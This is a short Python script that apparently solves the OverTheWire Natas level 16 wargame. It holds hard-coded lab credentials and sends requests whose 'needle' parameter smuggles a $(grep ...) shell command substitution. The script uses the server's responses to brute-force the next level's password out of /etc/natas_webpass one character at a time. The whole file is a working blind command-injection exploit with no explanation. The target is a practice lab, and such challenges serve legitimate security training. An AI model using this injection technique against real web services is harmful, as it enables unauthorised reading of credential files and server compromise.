#! /usr/bin/python3

import requests
from string import ascii_uppercase,ascii_lowercase,digits

characters = ascii_uppercase + ascii_lowercase + digits

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

pass_search = ''

cont = 0
while(True):
	for ch in characters:
		response = requests.get(url + '?needle=doomed$(grep ^' + pass_search + ch + ' /etc/natas_webpass/natas17)', auth=(username,password))
		if 'doomed' not in response.text:
			pass_search = pass_search + ch
			print(pass_search)
			cont = cont + 1
			break
	if cont == 32:
		break


